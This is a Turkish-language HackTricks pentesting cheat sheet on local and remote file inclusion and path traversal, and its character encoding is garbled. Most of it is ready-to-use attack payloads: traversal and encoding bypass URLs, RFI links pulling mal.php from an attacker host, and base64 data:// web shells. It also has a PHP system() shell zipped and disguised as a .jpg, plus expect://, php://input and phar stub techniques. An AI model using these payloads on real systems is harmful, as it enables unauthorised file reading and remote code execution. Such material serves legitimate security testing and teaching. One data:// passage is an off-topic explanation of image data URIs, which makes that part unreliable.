# Dosya Dahil Etme/Yol GeÃ§iÅŸi

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramanla Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi paylaÅŸarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na **PR gÃ¶ndererek** katkÄ±da bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

Deneyimli hackerlar ve Ã¶dÃ¼l avcÄ±larÄ±yla iletiÅŸim kurmak iÃ§in [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) sunucusuna katÄ±lÄ±n!

**Hacking Ä°Ã§gÃ¶rÃ¼leri**\
Hacking'in heyecanÄ±na ve zorluklarÄ±na dalmÄ±ÅŸ iÃ§eriklerle etkileÅŸim kurun

**GerÃ§ek ZamanlÄ± Hack Haberleri**\
HÄ±zlÄ± tempolu hacking dÃ¼nyasÄ±nÄ± gerÃ§ek zamanlÄ± haberler ve iÃ§gÃ¶rÃ¼lerle takip edin

**En Son Duyurular**\
Yeni Ã¶dÃ¼l avcÄ±larÄ±nÄ±n baÅŸlatÄ±ldÄ±ÄŸÄ± ve Ã¶nemli platform gÃ¼ncellemelerinin olduÄŸu duyurularla bilgilenin

**Bize katÄ±lÄ±n** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ve bugÃ¼n en iyi hackerlarla iÅŸbirliÄŸi yapmaya baÅŸlayÄ±n!

## Dosya Dahil Etme

**Uzaktan Dosya Dahil Etme (RFI):** Dosya uzaktan bir sunucudan yÃ¼klenir (En iyi: Kodu yazabilir ve sunucu onu yÃ¼rÃ¼tÃ¼r). Php'de bu varsayÄ±lan olarak **devre dÄ±ÅŸÄ±dÄ±r** (**allow\_url\_include**).\
**Yerel Dosya Dahil Etme (LFI):** Sunucu bir yerel dosyayÄ± yÃ¼kler.

Bu zafiyet, kullanÄ±cÄ±nÄ±n sunucu tarafÄ±ndan yÃ¼klenecek olan dosyayÄ± bir ÅŸekilde kontrol edebildiÄŸi durumlarda ortaya Ã§Ä±kar.

Zafiyete aÃ§Ä±k olan **PHP fonksiyonlarÄ±**: require, require\_once, include, include\_once

Bu zafiyeti sÃ¶mÃ¼rmek iÃ§in ilginÃ§ bir araÃ§: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## KÃ¶r - Ä°lginÃ§ - LFI2RCE dosyalarÄ±
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Ã‡eÅŸitli \*nix LFI listelerini birleÅŸtirerek ve daha fazla yol ekleyerek bu listeyi oluÅŸturdum:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

AyrÄ±ca `/` karakterini `\` ile deÄŸiÅŸtirmeyi deneyin\
AyrÄ±ca `../../../../../` yolunu eklemeyi deneyin

Vulnerabilite olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in /etc/password dosyasÄ±nÄ± bulmak iÃ§in Ã§eÅŸitli teknikler kullanan bir liste [burada](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt) bulunabilir.

### **Windows**

FarklÄ± wordlistelerin birleÅŸtirilmesi:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

AyrÄ±ca `/` karakterini `\` ile deÄŸiÅŸtirmeyi deneyin\
AyrÄ±ca `C:/` karakterini kaldÄ±rÄ±p `../../../../../` yolunu eklemeyi deneyin

Vulnerabilite olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in /boot.ini dosyasÄ±nÄ± bulmak iÃ§in Ã§eÅŸitli teknikler kullanan bir liste [burada](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt) bulunabilir.

### **OS X**

Linux'un LFI listesini kontrol edin.

## Temel LFI ve bypass yÃ¶ntemleri

TÃ¼m Ã¶rnekler Yerel Dosya Ä°Ã§eriÄŸi (LFI) iÃ§in olsa da, Uzak Dosya Ä°Ã§eriÄŸi (RFI) iÃ§in de uygulanabilir (page=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### Yinelemeli Olmayan Åekilde KesilmiÅŸ GeÃ§iÅŸ Dizileri

Bu bÃ¶lÃ¼mde, yinelemeli olmayan ÅŸekilde kesilmiÅŸ geÃ§iÅŸ dizileri kullanarak dosya dahil etme saldÄ±rÄ±larÄ± hakkÄ±nda bilgi bulacaksÄ±nÄ±z. Bu saldÄ±rÄ±lar, hedef web uygulamasÄ±nÄ±n gÃ¼venlik aÃ§Ä±klarÄ±nÄ± kullanarak hedef sisteme yetkisiz eriÅŸim elde etmek iÃ§in kullanÄ±lÄ±r.

Dosya dahil etme saldÄ±rÄ±larÄ±, hedef web uygulamasÄ±nÄ±n, kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan dosya yolunu doÄŸrulamadan veya sÄ±nÄ±rlamadan dahil etmesi nedeniyle ortaya Ã§Ä±kar. Bu, saldÄ±rganÄ±n, hedef sistemin dosya sistemine eriÅŸim saÄŸlamasÄ±na ve hassas verilere eriÅŸmesine olanak tanÄ±r.

Yinelemeli olmayan ÅŸekilde kesilmiÅŸ geÃ§iÅŸ dizileri, saldÄ±rganÄ±n hedef web uygulamasÄ±nda dosya yolunu manipÃ¼le etmek iÃ§in kullandÄ±ÄŸÄ± bir tekniktir. Bu teknik, saldÄ±rganÄ±n hedef sistemin dosya sistemine eriÅŸim saÄŸlamasÄ±na ve istediÄŸi dosyalarÄ± dahil etmesine olanak tanÄ±r.

Bu bÃ¶lÃ¼mde, yinelemeli olmayan ÅŸekilde kesilmiÅŸ geÃ§iÅŸ dizileri kullanarak dosya dahil etme saldÄ±rÄ±larÄ±nÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±lan bazÄ± teknikler ve yÃ¶ntemler aÃ§Ä±klanmaktadÄ±r. Bu teknikler ve yÃ¶ntemler, saldÄ±rganÄ±n hedef web uygulamasÄ±nda gÃ¼venlik aÃ§Ä±klarÄ±nÄ± tespit etmesine ve bu aÃ§Ä±klarÄ± kullanarak hedef sisteme yetkisiz eriÅŸim elde etmesine yardÄ±mcÄ± olur.
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

SaÄŸlanan dizeye sonuna daha fazla karakter ekleyerek atlayÄ±n (atlatma: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Bu, **PHP 5.4'ten beri Ã§Ã¶zÃ¼lmÃ¼ÅŸtÃ¼r**.

### **Kodlama**

Ã‡ift URL kodlamasÄ± (ve diÄŸerleri gibi) gibi standart olmayan kodlamalarÄ± kullanabilirsiniz:
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Var olan bir klasÃ¶rden

Muhtemelen arka uÃ§, klasÃ¶r yolunu kontrol ediyor:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Sunucudaki Dosya Sistemi Dizinlerini KeÅŸfetme

Bir sunucunun dosya sistemi, belirli teknikler kullanÄ±larak sadece dosyalarÄ± deÄŸil, dizinleri de keÅŸfetmek iÃ§in rekÃ¼rsif olarak taranabilir. Bu sÃ¼reÃ§, dizin derinliÄŸini belirlemeyi ve belirli klasÃ¶rlerin varlÄ±ÄŸÄ±nÄ± sorgulamayÄ± iÃ§erir. AÅŸaÄŸÄ±da bu iÅŸlemi gerÃ§ekleÅŸtirmek iÃ§in detaylÄ± bir yÃ¶ntem bulunmaktadÄ±r:

1. **Dizin DerinliÄŸini Belirleme:**
Mevcut dizinin derinliÄŸini belirlemek iÃ§in `/etc/passwd` dosyasÄ±nÄ± (sunucu Linux tabanlÄ± ise geÃ§erli) baÅŸarÄ±yla alarak dizin derinliÄŸini belirleyin. Ã–rnek bir URL aÅŸaÄŸÄ±daki gibi yapÄ±landÄ±rÄ±lmÄ±ÅŸ olabilir ve Ã¼Ã§ derinlik gÃ¶stermektedir:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **KlasÃ¶rleri AraÅŸtÄ±rma:**
URL'nin sonuna ÅŸÃ¼pheli klasÃ¶rÃ¼n adÄ±nÄ± (Ã¶rneÄŸin, `private`) ekleyin, ardÄ±ndan `/etc/passwd`'a geri dÃ¶nÃ¼n. Eklenen dizin seviyesi bir artÄ±ÅŸ gerektirdiÄŸinden derinliÄŸi bir birim artÄ±rÄ±n:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **SonuÃ§larÄ± YorumlayÄ±n:**
Sunucunun yanÄ±tÄ±, klasÃ¶rÃ¼n var olup olmadÄ±ÄŸÄ±nÄ± gÃ¶sterir:
- **Hata / Ã‡Ä±ktÄ± Yok:** `private` klasÃ¶rÃ¼ muhtemelen belirtilen konumda mevcut deÄŸil.
- **`/etc/passwd` DosyasÄ±nÄ±n Ä°Ã§eriÄŸi:** `private` klasÃ¶rÃ¼nÃ¼n varlÄ±ÄŸÄ± doÄŸrulandÄ±.

4. **RekÃ¼rsif KeÅŸif:**
KeÅŸfedilen klasÃ¶rler, aynÄ± teknik veya geleneksel Yerel Dosya Dahil Etme (LFI) yÃ¶ntemleri kullanÄ±larak alt dizinler veya dosyalar iÃ§in daha fazla sorgulanabilir.

Dosya sisteminde farklÄ± konumlardaki dizinleri keÅŸfetmek iÃ§in yÃ¼kÃ¼ uygun ÅŸekilde ayarlayÄ±n. Ã–rneÄŸin, `/var/www/` dizininde `private` adlÄ± bir dizin olup olmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in (mevcut dizin 3 derinlikte ise):
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Yol KÄ±saltma TekniÄŸi**

Yol kÄ±saltma, web uygulamalarÄ±nda dosya yollarÄ±nÄ± manipÃ¼le etmek iÃ§in kullanÄ±lan bir yÃ¶ntemdir. SÄ±klÄ±kla, dosya yollarÄ±nÄ±n sonuna ek karakterler ekleyen belirli gÃ¼venlik Ã¶nlemlerini atlayarak kÄ±sÄ±tlanmÄ±ÅŸ dosyalara eriÅŸmek iÃ§in kullanÄ±lÄ±r. AmaÃ§, gÃ¼venlik Ã¶nlemi tarafÄ±ndan deÄŸiÅŸtirildiÄŸinde hala istenen dosyaya iÅŸaret eden bir dosya yolunu oluÅŸturmaktÄ±r.

PHP'de, dosya sisteminin doÄŸasÄ± gereÄŸi, bir dosya yolunun Ã§eÅŸitli temsilleri eÅŸdeÄŸer kabul edilebilir. Ã–rneÄŸin:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` ve `/etc/passwd/` tÃ¼mÃ¼ aynÄ± yol olarak kabul edilir.
- Son 6 karakteri `passwd` olan bir dosya yoluna `/` eklemek (bunu `passwd/` yapmak), hedeflenen dosyayÄ± deÄŸiÅŸtirmez.
- Benzer ÅŸekilde, bir dosya yoluna `.php` eklenirse (Ã¶rneÄŸin `shellcode.php`), sonuna `/.` eklemek eriÅŸilen dosyayÄ± deÄŸiÅŸtirmez.

SaÄŸlanan Ã¶rnekler, hassas iÃ§eriÄŸi (kullanÄ±cÄ± hesap bilgileri) nedeniyle yaygÄ±n bir hedef olan `/etc/passwd`'ye eriÅŸmek iÃ§in yol kÄ±saltmayÄ± nasÄ±l kullanacaÄŸÄ±nÄ±zÄ± gÃ¶stermektedir:
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Bu senaryolarda, gerekli olan geÃ§iÅŸ sayÄ±sÄ± yaklaÅŸÄ±k olarak 2027 olabilir, ancak bu sayÄ± sunucunun yapÄ±landÄ±rmasÄ±na baÄŸlÄ± olarak deÄŸiÅŸebilir.

- **Nokta Segmentleri ve Ek Karakterler Kullanma**:
GeÃ§iÅŸ dizileri (`../`), ek nokta segmentleri ve karakterlerle birleÅŸtirilerek dosya sisteminde gezinmek iÃ§in kullanÄ±labilir, bu sayede sunucu tarafÄ±ndan eklenen dizeler gÃ¶rmezden gelinir.

- **Gerekli GeÃ§iÅŸ SayÄ±sÄ±nÄ± Belirleme**:
Deneme yanÄ±lma yoluyla, kÃ¶k dizine ve ardÄ±ndan `/etc/passwd` dizinine gezinmek iÃ§in gereken `../` dizilerinin tam sayÄ±sÄ±nÄ± bulabilirsiniz. Bu sayede eklenen dizeler (Ã¶rneÄŸin `.php`) etkisiz hale getirilir, ancak istenen yol (`/etc/passwd`) korunur.

- **Sahte Bir Dizinle BaÅŸlama**:
Yolun baÅŸÄ±na mevcut olmayan bir dizinle (Ã¶rneÄŸin `a/`) baÅŸlamak yaygÄ±n bir uygulamadÄ±r. Bu teknik, Ã¶nlem amaÃ§lÄ± olarak veya sunucunun yol ayrÄ±ÅŸtÄ±rma mantÄ±ÄŸÄ± gereksinimlerini karÅŸÄ±lamak iÃ§in kullanÄ±lÄ±r.

Yol kÄ±rpma tekniklerini kullanÄ±rken, sunucunun yol ayrÄ±ÅŸtÄ±rma davranÄ±ÅŸÄ±nÄ± ve dosya sistemi yapÄ±sÄ±nÄ± anlamak Ã¶nemlidir. Her senaryo farklÄ± bir yaklaÅŸÄ±m gerektirebilir ve genellikle en etkili yÃ¶ntemi bulmak iÃ§in test yapmak gereklidir.

**Bu gÃ¼venlik aÃ§Ä±ÄŸÄ± PHP 5.3'te dÃ¼zeltilmiÅŸtir.**

### **Filtre atlama hileleri**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Uzaktan Dosya Dahil Etme

Php'de bu varsayÄ±lan olarak devre dÄ±ÅŸÄ± bÄ±rakÄ±lmÄ±ÅŸtÄ±r Ã§Ã¼nkÃ¼ **`allow_url_include`** **KapalÄ±** durumdadÄ±r. Ã‡alÄ±ÅŸmasÄ± iÃ§in **AÃ§Ä±k** olmasÄ± gerekmektedir ve bu durumda sunucunuzdan bir PHP dosyasÄ±nÄ± dahil edebilir ve RCE elde edebilirsiniz:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
EÄŸer herhangi bir nedenden dolayÄ± **`allow_url_include`** **AÃ§Ä±k** olsa da, PHP dÄ±ÅŸ web sayfalarÄ±na eriÅŸimi **filtreliyorsa**, [bu yazÄ±ya](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/) gÃ¶re, Ã¶rneÄŸin base64 ile kodlanmÄ±ÅŸ bir PHP kodunu Ã§Ã¶zmek ve RCE elde etmek iÃ§in veri protokolÃ¼nÃ¼ kullanabilirsiniz:

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
Ã–nceki kodda, saldÄ±rganÄ±n `.txt` ile biten bir dizeye ihtiyacÄ± olduÄŸu iÃ§in, dize onunla bitiyor ve b64 decode iÅŸleminden sonra bu kÄ±sÄ±m sadece gereksiz bilgi dÃ¶ndÃ¼recektir ve gerÃ§ek PHP kodu dahil edilecek (ve dolayÄ±sÄ±yla, yÃ¼rÃ¼tÃ¼lecektir).
{% endhint %}

`php://` protokolÃ¼nÃ¼ kullanmayan baÅŸka bir Ã¶rnek ise:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python KÃ¶k Ã¶ÄŸesi

Python'da ÅŸu gibi bir kodda:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
EÄŸer kullanÄ±cÄ± **`file_name`** iÃ§in bir **mutlak yol** geÃ§irirse, **Ã¶nceki yol sadece kaldÄ±rÄ±lÄ±r**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Bu, [belgelere](https://docs.python.org/3.10/library/os.path.html#os.path.join) gÃ¶re beklenen davranÄ±ÅŸtÄ±r:

> EÄŸer bir bileÅŸen mutlak bir yol ise, tÃ¼m Ã¶nceki bileÅŸenler atÄ±lÄ±r ve birleÅŸtirme mutlak yol bileÅŸeninden devam eder.

## Java Dizinleri Listeleme

Java'da bir Yol GeÃ§iÅŸi (Path Traversal) olduÄŸunda ve bir **dosya yerine bir dizin isterseniz**, **dizin listesi dÃ¶ndÃ¼rÃ¼lÃ¼r**. Bu diÄŸer dillerde (bildiÄŸim kadarÄ±yla) gerÃ§ekleÅŸmez.

## Ä°lk 25 parametre

Ä°ÅŸte yerel dosya dahil etme (LFI) zafiyetlerine karÅŸÄ± savunmasÄ±z olabilecek ilk 25 parametre listesi ([linkten](https://twitter.com/trbughunters/status/1279768631845494787) alÄ±nmÄ±ÅŸtÄ±r):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## PHP sargÄ±layÄ±cÄ±larÄ± ve protokollerini kullanarak LFI / RFI

### php://filter

PHP filtreleri, verinin okunmadan veya yazÄ±lmadan Ã¶nce temel **deÄŸiÅŸtirme iÅŸlemlerini** gerÃ§ekleÅŸtirmenizi saÄŸlar. 5 kategoriye ayrÄ±lÄ±rlar:

* [Dize Filtreleri](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Veriden etiketleri kaldÄ±rÄ±r ("<" ve ">" karakterleri arasÄ±ndaki her ÅŸey)
* Bu filtre, modern PHP sÃ¼rÃ¼mlerinden kaybolmuÅŸtur.
* [DÃ¶nÃ¼ÅŸÃ¼m Filtreleri](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*`: FarklÄ± bir kodlamaya dÃ¶nÃ¼ÅŸtÃ¼rÃ¼r (`convert.iconv.<input_enc>.<output_enc>`). Desteklenen **tÃ¼m kodlamalarÄ±n listesini** almak iÃ§in konsolda ÅŸunu Ã§alÄ±ÅŸtÄ±rÄ±n: `iconv -l`

{% hint style="warning" %}
`convert.iconv.*` dÃ¶nÃ¼ÅŸÃ¼m filtresini kÃ¶tÃ¼ye kullanarak, **keyfi metin oluÅŸturabilirsiniz**, bu da keyfi metin yazmak veya keyfi metin iÅŸleme iÅŸlevi yapmak iÃ§in kullanÄ±ÅŸlÄ± olabilir. Daha fazla bilgi iÃ§in [**php filtreleri aracÄ±lÄ±ÄŸÄ±yla LFI2RCE**](lfi2rce-via-php-filters.md)'ye bakÄ±n.
{% endhint %}

* [SÄ±kÄ±ÅŸtÄ±rma Filtreleri](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Ä°Ã§eriÄŸi sÄ±kÄ±ÅŸtÄ±rÄ±r (Ã§ok fazla bilgi Ã§Ä±karmak iÃ§in kullanÄ±ÅŸlÄ±dÄ±r)
* `zlib.inflate`: Veriyi aÃ§ar
* [Åifreleme Filtreleri](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*`: KullanÄ±mdan kaldÄ±rÄ±ldÄ±
* `mdecrypt.*`: KullanÄ±mdan kaldÄ±rÄ±ldÄ±
* DiÄŸer Filtreler
* php'de `var_dump(stream_get_filters());` Ã§alÄ±ÅŸtÄ±rarak birkaÃ§ **beklenmeyen filtre** bulabilirsiniz:
* `consumed`
* `dechunk`: HTTP parÃ§alÄ± kodlamayÄ± tersine Ã§evirir
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
"php://filter" kÄ±smÄ± harf bÃ¼yÃ¼klÃ¼ÄŸÃ¼ne duyarsÄ±zdÄ±r.
{% endhint %}

### php://fd

Bu sarmalayÄ±cÄ±, iÅŸlemin aÃ§Ä±k olan dosya tanÄ±mlayÄ±cÄ±larÄ±na eriÅŸim saÄŸlar. AÃ§Ä±k dosyalarÄ±n iÃ§eriÄŸini dÄ±ÅŸarÄ± Ã§Ä±karmak iÃ§in potansiyel olarak kullanÄ±ÅŸlÄ±dÄ±r:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
**php://stdin, php://stdout ve php://stderr** kullanarak **sÄ±rasÄ±yla dosya tanÄ±mlayÄ±cÄ±larÄ± 0, 1 ve 2'ye** eriÅŸebilirsiniz (bu saldÄ±rÄ±da nasÄ±l kullanÄ±labileceÄŸinden emin deÄŸilim)

### zip:// ve rar://

Ä°Ã§inde bir PHPShell bulunan bir Zip veya Rar dosyasÄ± yÃ¼kleyin ve eriÅŸin.\
Rar protokolÃ¼nÃ¼ istismar edebilmek iÃ§in **Ã¶zel olarak etkinleÅŸtirilmesi gerekmektedir**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

Bu, bir veri URI'sidir ve web sayfalarÄ±nda iÃ§erik yerine kullanÄ±labilir. Veri URI'si, iÃ§eriÄŸi doÄŸrudan URL'de kodlayarak sayfaya dahil etmek iÃ§in kullanÄ±lÄ±r. Bu, dosya iÃ§eriÄŸini doÄŸrudan HTML veya CSS dosyasÄ±na eklemek iÃ§in kullanÄ±labilir.

Ã–rneÄŸin, aÅŸaÄŸÄ±daki HTML kodu, bir resmi veri URI'si olarak iÃ§eriÄŸe dahil eder:

```html
<img src="data:image/png;base64,iVBORw0KG..."/>
```

Bu, resmin dosya yolunu belirtmek yerine, resmin kendisini iÃ§eriÄŸe dahil eder. Bu, harici bir dosyaya baÄŸÄ±mlÄ±lÄ±ÄŸÄ± ortadan kaldÄ±rÄ±r ve sayfanÄ±n daha hÄ±zlÄ± yÃ¼klenmesini saÄŸlar.

Veri URI'si ayrÄ±ca metin iÃ§eriÄŸini de dahil etmek iÃ§in kullanÄ±labilir. Ã–rneÄŸin, aÅŸaÄŸÄ±daki CSS kodu, bir metin dosyasÄ±nÄ± veri URI'si olarak iÃ§eriÄŸe dahil eder:

```html
<style>
@import url("data:text/css;charset=utf-8;base64,dGVzdCBjb25zdCBkYXRhIHNjaGVtZXMgYXJlIGNvbW1vbmx5IHRvIGJlZ2luIGluIHN0b3JlZCBhbmQgdHJhbnNmZXJyZWQgdGV4dC4=");
</style>
```

Bu, harici bir CSS dosyasÄ±na baÄŸÄ±mlÄ±lÄ±ÄŸÄ± ortadan kaldÄ±rÄ±r ve sayfanÄ±n daha hÄ±zlÄ± yÃ¼klenmesini saÄŸlar.

Veri URI'si kullanÄ±rken dikkatli olunmalÄ±dÄ±r Ã§Ã¼nkÃ¼ iÃ§eriÄŸi doÄŸrudan URL'de kodladÄ±ÄŸÄ± iÃ§in, iÃ§eriÄŸin boyutu bÃ¼yÃ¼k olduÄŸunda sayfanÄ±n yÃ¼klenme sÃ¼resini etkileyebilir. AyrÄ±ca, bazÄ± tarayÄ±cÄ±lar veri URI'sini desteklemeyebilir veya sÄ±nÄ±rlÄ± boyutlarda destekleyebilir.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Bu protokol, php yapÄ±landÄ±rmalarÄ± **`allow_url_open`** ve **`allow_url_include`** tarafÄ±ndan kÄ±sÄ±tlanmÄ±ÅŸtÄ±r.

### expect://

Expect etkinleÅŸtirilmelidir. Kodu ÅŸu ÅŸekilde Ã§alÄ±ÅŸtÄ±rabilirsiniz:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

POST parametrelerinde payload'Ä±nÄ±zÄ± belirtin:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Bir `.phar` dosyasÄ±, bir web uygulamasÄ± `include` gibi dosya yÃ¼kleme iÅŸlevlerini kullandÄ±ÄŸÄ±nda PHP kodunu yÃ¼rÃ¼tmek iÃ§in kullanÄ±labilir. AÅŸaÄŸÄ±daki PHP kodu Ã¶rneÄŸi, bir `.phar` dosyasÄ±nÄ±n nasÄ±l oluÅŸturulacaÄŸÄ±nÄ± gÃ¶stermektedir:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
`.phar` dosyasÄ±nÄ± derlemek iÃ§in aÅŸaÄŸÄ±daki komut Ã§alÄ±ÅŸtÄ±rÄ±lmalÄ±dÄ±r:
```bash
php --define phar.readonly=0 create_path.php
```
Ã‡alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda `test.phar` adÄ±nda bir dosya oluÅŸturulur ve bu dosya Local File Inclusion (LFI) zafiyetlerini sÃ¶mÃ¼rmek iÃ§in kullanÄ±labilir.

LFI'nin yalnÄ±zca PHP kodunu Ã§alÄ±ÅŸtÄ±rmadan dosya okuma iÅŸlemi gerÃ§ekleÅŸtirdiÄŸi durumlarda, `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` veya `filesize()` gibi iÅŸlevler aracÄ±lÄ±ÄŸÄ±yla, deserialization zafiyetinin sÃ¶mÃ¼rÃ¼lmesi denenebilir. Bu zafiyet, `phar` protokolÃ¼ kullanÄ±larak dosyalarÄ±n okunmasÄ±yla iliÅŸkilidir.

